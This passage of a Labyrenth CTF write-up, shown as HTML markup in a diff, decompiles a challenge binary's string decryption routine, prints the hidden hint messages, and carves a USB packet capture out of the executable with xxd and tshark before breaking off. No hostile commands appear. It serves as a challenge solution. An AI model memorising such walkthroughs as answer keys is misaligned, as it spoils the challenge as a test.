class="mi">41</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">64</span><span class="p">,</span><span class="mi">64</span>
+        <span class="p">};</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">MagicNum</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[]</span>
+        <span class="p">{</span>
+            <span class="mi">9</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">86</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">64</span><span class="p">,</span><span class="mi">64</span>
+        <span class="p">};</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">trollMum</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[]</span>
+        <span class="p">{</span>
+            <span class="mi">77</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">64</span><span class="p">,</span><span class="mi">64</span>
+        <span class="p">};</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">trollNum</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[]</span>
+        <span class="p">{</span>
+            <span class="mi">50</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">86</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">86</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">76</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">64</span><span class="p">,</span><span class="mi">64</span>
+        <span class="p">};</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">Main</span><span class="p">()</span>
+		<span class="p">{</span>
+            <span class="n">string</span> <span class="n">str</span> <span class="o">=</span> <span class="n">Form1</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">StringToXOR</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">ByteToStr</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">trollMum</span><span class="p">)),</span> <span class="n">Form1</span><span class="p">.</span><span class="n">szKeyValue</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Do you know  "</span> <span class="o">+</span> <span class="n">str</span><span class="p">);</span>
+            <span class="n">string</span> <span class="n">str2</span> <span class="o">=</span> <span class="n">Form1</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">StringToXOR</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">ByteToStr</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">MagicNum</span><span class="p">)),</span> <span class="n">Form1</span><span class="p">.</span><span class="n">szKeyValue</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Do you know  "</span> <span class="o">+</span> <span class="n">str2</span><span class="p">);</span>
+            <span class="n">string</span> <span class="n">str3</span> <span class="o">=</span> <span class="n">Form1</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">StringToXOR</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">ByteToStr</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">MagicMum</span><span class="p">)),</span> <span class="n">Form1</span><span class="p">.</span><span class="n">szKeyValue</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Do you know  "</span> <span class="o">+</span> <span class="n">str3</span><span class="p">);</span>
+            <span class="n">string</span> <span class="n">str4</span> <span class="o">=</span> <span class="n">Form1</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">StringToXOR</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">ByteToStr</span><span class="p">(</span><span class="n">Form1</span><span class="p">.</span><span class="n">trollNum</span><span class="p">)),</span> <span class="n">Form1</span><span class="p">.</span><span class="n">szKeyValue</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Do you know  "</span> <span class="o">+</span> <span class="n">str4</span><span class="p">);</span>
+        <span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="nf">ByteToStr</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">buf</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">stringTobyte</span><span class="p">(</span><span class="n">string</span> <span class="n">str</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">());</span>
+		<span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">ByteTostring</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">bt</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">string</span> <span class="n">text</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bt</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="n">text</span> <span class="o">+=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">bt</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+			<span class="p">}</span>
+			<span class="k">return</span> <span class="n">text</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">StringToXOR</span><span class="p">(</span><span class="n">string</span> <span class="n">data</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+			<span class="n">array</span> <span class="o">=</span> <span class="n">Form1</span><span class="p">.</span><span class="n">stringTobyte</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="n">byte</span><span class="p">[]</span> <span class="n">expr_24_cp_0</span> <span class="o">=</span> <span class="n">array</span><span class="p">;</span>
+				<span class="kt">int</span> <span class="n">expr_24_cp_1</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+				<span class="n">expr_24_cp_0</span><span class="p">[</span><span class="n">expr_24_cp_1</span><span class="p">]</span> <span class="o">^=</span> <span class="mi">37</span><span class="p">;</span>
+				<span class="n">byte</span><span class="p">[]</span> <span class="n">expr_32_cp_0</span> <span class="o">=</span> <span class="n">array</span><span class="p">;</span>
+				<span class="kt">int</span> <span class="n">expr_32_cp_1</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+				<span class="n">expr_32_cp_0</span><span class="p">[</span><span class="n">expr_32_cp_1</span><span class="p">]</span> <span class="o">^=</span> <span class="mi">88</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">return</span> <span class="n">Form1</span><span class="p">.</span><span class="n">ByteTostring</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">xorToString</span><span class="p">(</span><span class="n">string</span> <span class="n">data</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+			<span class="n">array</span> <span class="o">=</span> <span class="n">Form1</span><span class="p">.</span><span class="n">stringTobyte</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="n">byte</span><span class="p">[]</span> <span class="n">expr_24_cp_0</span> <span class="o">=</span> <span class="n">array</span><span class="p">;</span>
+				<span class="kt">int</span> <span class="n">expr_24_cp_1</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+				<span class="n">expr_24_cp_0</span><span class="p">[</span><span class="n">expr_24_cp_1</span><span class="p">]</span> <span class="o">^=</span> <span class="mi">21</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">return</span> <span class="n">Form1</span><span class="p">.</span><span class="n">ByteTostring</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">string</span> <span class="n">textToDecrypt</span><span class="p">,</span> <span class="n">string</span> <span class="n">key</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">RijndaelManaged</span> <span class="n">expr_05</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RijndaelManaged</span><span class="p">();</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">Padding</span> <span class="o">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="n">PKCS7</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">KeySize</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">BlockSize</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">textToDecrypt</span><span class="p">);</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">arg_43_0</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+			<span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">arg_43_0</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
+			<span class="n">Array</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">arg_43_0</span><span class="p">,</span> <span class="n">array2</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">Key</span> <span class="o">=</span> <span class="n">array2</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">IV</span> <span class="o">=</span> <span class="n">array2</span><span class="p">;</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">expr_05</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">().</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+			<span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">Encrypt</span><span class="p">(</span><span class="n">string</span> <span class="n">textToEncrypt</span><span class="p">,</span> <span class="n">string</span> <span class="n">key</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">RijndaelManaged</span> <span class="n">expr_05</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RijndaelManaged</span><span class="p">();</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">Padding</span> <span class="o">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="n">PKCS7</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">KeySize</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">BlockSize</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">arg_3C_0</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+			<span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">arg_3C_0</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
+			<span class="n">Array</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">arg_3C_0</span><span class="p">,</span> <span class="n">array</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">Key</span> <span class="o">=</span> <span class="n">array</span><span class="p">;</span>
+			<span class="n">expr_05</span><span class="p">.</span><span class="n">IV</span> <span class="o">=</span> <span class="n">array</span><span class="p">;</span>
+			<span class="n">ICryptoTransform</span> <span class="n">arg_6B_0</span> <span class="o">=</span> <span class="n">expr_05</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">();</span>
+			<span class="n">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">textToEncrypt</span><span class="p">);</span>
+			<span class="k">return</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">arg_6B_0</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">));</span>
+		<span class="p">}</span>
+
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And here they are :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mcs decrypt.mono 
+<span class="nv">$ </span>wine decrypt.exe
+Do you know  There are images within the usb.pcap!
+Do you know  The key to decrypt the flag is XOR 0x21
+Do you know  You got to try harder than this!
+Do you know  That Labyrenth CTF is pretty decent.
+</code></pre></div></div>
+
+<p><em>What</em>.<em>The</em>.<em>Hell</em> !</p>
+
+<h2 id="usb-pcap">USB PCAP</h2>
+
+<p>Running <code class="highlighter-rouge">strings</code> on the file shows loooot of <code class="highlighter-rouge">USBS</code> and <code class="highlighter-rouge">USBC</code> words. What ?
+This looks like some usb dump. However, neither binwalk nor hachoir find it.</p>
+
+<p>So, after some googling (yes, again), we find that this USB pcap file should starts with 0xd4c3b2a1. Luckily, there is such sequence at position 0x3094 of our exe file. So :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>xxd <span class="nt">-s</span> 0x3094 part1.flag.exe   |xxd <span class="nt">-r</span> <span class="nt">-s</span> <span class="nt">-0x3094</span> <span class="o">&gt;</span> usb.pcap
+</code></pre></div></div>
+
+<p>First xxd dumps starting at 0x03094. Second reverse and adds a negative offset of 0x3094 (to start at 0x0).</p>
+
+<p>At the end we get a <code class="highlighter-rouge">tcpdump capture file (little-endian) - version 2.4, capture length 65535)</code>. Perfect.</p>
+
+<p>After a quick look at it with wireshark, we see some keys pressed and a lot of “big” transfers. Some are looking like pictures. Let’s extract them all :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ i</span><span class="o">=</span>0<span class="p">;</span> tshark <span class="nt">-T</span> fields <span class="nt">-e</span> usb.capdata  <span class="nt">-r</span> usb.pcap | tr <span class="nt">-d</span> <span class="s1">':'</span> | <span class="nb">grep</span> <span class="s1">'.\{500\}'</span> | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$line</span> | xxd <span class="nt">-r</span> <span class="nt">-ps</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">i</span><span class="k">}</span>.raw<span class="p">;</span> <span class="nv">i</span><span class="o">=</span><span class="k">$((</span>i+1<span class="k">))</span><span class="p">;</span><span class="k">done</span>
